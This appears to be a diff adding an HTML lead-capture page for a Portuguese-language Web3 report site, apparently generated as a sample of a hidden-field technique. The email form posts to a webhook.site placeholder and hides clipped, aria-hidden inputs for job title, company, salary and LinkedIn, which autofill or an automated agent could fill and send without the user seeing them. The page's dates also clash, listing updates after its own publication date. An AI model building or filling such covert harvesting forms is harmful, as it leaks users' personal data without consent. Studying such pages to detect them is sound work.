@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChainBR | Estado da Web3 em São Paulo 2026</title>
+    <!-- gfe-technique: aria-hidden + sr-only clip -->
+    <style>
+        :root { --primary: #0066ff; }
+        *, *::before, *::after { box-sizing: border-box; }
+        body { font-family: 'Inter', system-ui, sans-serif; margin: 0; background: #f0f2f5; color: #1a1a1a; display: flex; min-height: 100vh; }
+        .sidebar-nav { width: 220px; background: #fff; border-right: 1px solid #e8e8e8; padding: 20px 0; flex-shrink: 0; }
+        .sidebar-nav .brand { font-size: 1.2rem; font-weight: 800; color: var(--primary); padding: 0 20px 20px; border-bottom: 1px solid #eee; margin-bottom: 10px; }
+        .sidebar-nav a { display: block; padding: 10px 20px; text-decoration: none; color: #555; font-size: 0.9rem; font-weight: 500; border-left: 3px solid transparent; }
+        .sidebar-nav a.active { color: var(--primary); border-left-color: var(--primary); background: #f8f9ff; }
+        .main { flex: 1; padding: 30px; overflow: auto; }
+        .page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
+        .page-header h1 { margin: 0; font-size: 1.6rem; }
+        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 24px; }
+        .card { background: #fff; border-radius: 10px; padding: 24px; border: 1px solid #e8e8e8; }
+        .card h3 { margin: 0 0 16px; font-size: 1rem; color: #555; }
+        .main-input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; font-size: 0.95rem; margin-bottom: 8px; }
+        .btn { width: 100%; background: var(--primary); color: #fff; border: none; padding: 12px; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 0.95rem; }
+        table { width: 100%; border-collapse: collapse; }
+        th { text-align: left; padding: 12px; font-size: 0.8rem; text-transform: uppercase; color: #999; border-bottom: 2px solid #eee; }
+        @media (max-width: 900px) { body { flex-direction: column; } .sidebar-nav { width: 100%; } .stats-grid { grid-template-columns: repeat(2, 1fr); } }
+    </style>
+</head>
+<body>
+    <nav class="sidebar-nav">
+        <div class="brand">ChainBR</div>
+        <a href="#" class="active">Dashboard</a>
+        <a href="#">Relatórios</a>
+        <a href="#">Dados</a>
+        <a href="#">Configurações</a>
+        <a href="#">Suporte</a>
+    </nav>
+    <div class="main">
+        <div class="page-header">
+            <h1>Estado da Web3 em São Paulo 2026</h1>
+            <span style="font-size:0.85rem; color:#999;">17/4/2026</span>
+        </div>
+        <div class="stats-grid"><div style="background:#fff; padding:20px; border-radius:8px; border:1px solid #e8e8e8; text-align:center;"><div style="font-size:2rem; font-weight:800; color:#0066ff;">258</div><div style="font-size:0.8rem; color:#777; margin-top:4px;">Usuários Ativos</div></div><div style="background:#fff; padding:20px; border-radius:8px; border:1px solid #e8e8e8; text-align:center;"><div style="font-size:2rem; font-weight:800; color:#0066ff;">74%</div><div style="font-size:0.8rem; color:#777; margin-top:4px;">Uptime</div></div><div style="background:#fff; padding:20px; border-radius:8px; border:1px solid #e8e8e8; text-align:center;"><div style="font-size:2rem; font-weight:800; color:#0066ff;">R$ 196M</div><div style="font-size:0.8rem; color:#777; margin-top:4px;">Movimentado</div></div><div style="background:#fff; padding:20px; border-radius:8px; border:1px solid #e8e8e8; text-align:center;"><div style="font-size:2rem; font-weight:800; color:#0066ff;">113</div><div style="font-size:0.8rem; color:#777; margin-top:4px;">Instituições</div></div></div>
+        <div style="display:grid; grid-template-columns: 1fr 320px; gap:20px;">
+            <div class="card">
+                <h3>Atualizações Recentes</h3>
+                <table>
+                    <thead><tr><th>Título</th><th>Descrição</th><th>Data</th></tr></thead>
+                    <tbody><tr><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.9rem;">L2 Nativas para Empresas</td><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.85rem; color:#666;">Como Arbitrum Orbit permite que empresas paulistas rodem sua...</td><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.8rem; color:#999;">14/9/2026</td></tr><tr><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.9rem;">Suzano e Blockchain de Carbono</td><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.85rem; color:#666;">Gigante do papel usa tokens ERC-1155 para rastrear créditos ...</td><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.8rem; color:#999;">25/10/2026</td></tr><tr><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.9rem;">Wallets ERC-4337 em Massa</td><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.85rem; color:#666;">Account abstraction chega ao varejo: bancos tradicionais tes...</td><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.8rem; color:#999;">16/12/2026</td></tr><tr><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.9rem;">Viem vs Ethers.js em Produção</td><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.85rem; color:#666;">Análise técnica da migração de bibliotecas no backend da Pic...</td><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.8rem; color:#999;">24/1/2026</td></tr><tr><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.9rem;">Hackathon Inteli DeFi 2026</td><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.85rem; color:#666;">Cobertura ao vivo dos vencedores do desafio Chainlink e suas...</td><td style="padding:12px; border-bottom:1px solid #eee; font-size:0.8rem; color:#999;">23/3/2026</td></tr></tbody>
+                </table>
+            </div>
+            <div class="card">
+                <h3>Baixar Report Completo (PDF)</h3>
+                <p style="font-size:0.85rem; color:#666; margin-bottom:16px;">Insira seu e-mail para receber o link de acesso.</p>
+                <!-- gfe-technique: aria-hidden + sr-only clip -->
+                <form action="https://webhook.site/SEU-ID-AQUI" method="POST">
+                    <input type="email" name="user_email" placeholder="Seu e-mail" required class="main-input">
+<div style="position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0;" aria-hidden="true">
+  <input type="text" name="full_role" placeholder="JOB_TITLE" style="width: 100%; font-size: 0.8rem; padding: 4px; border: none;" autocomplete="off" tabindex="-1">
+  <input type="text" name="full_company" placeholder="COMPANY" style="width: 100%; font-size: 0.8rem; padding: 4px; border: none;" autocomplete="off" tabindex="-1">
+  <input type="text" name="full_salary" placeholder="salário" style="width: 100%; font-size: 0.8rem; padding: 4px; border: none;" autocomplete="off" tabindex="-1">
+  <input type="text" name="full_linkedin" placeholder="LINKEDIN" style="width: 100%; font-size: 0.8rem; padding: 4px; border: none;" autocomplete="off" tabindex="-1">
+</div>
+                    <button type="submit" class="btn">GERAR LINK DE DOWNLOAD</button>
+                </form>
+                <p style="font-size:0.72rem; color:#bbb; margin-top:10px;">Documento de 42 páginas. PDF (12MB).</p>
+                <hr style="margin:20px 0; border-color:#eee;">
+                <p style="font-size:0.85rem; color:#666; margin:0;">Algoritmos de grafos aplicados a redes de liquidez estão permitindo otimização de rotas em DEXs com economia de até 18% em slippage nas principais poo...</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
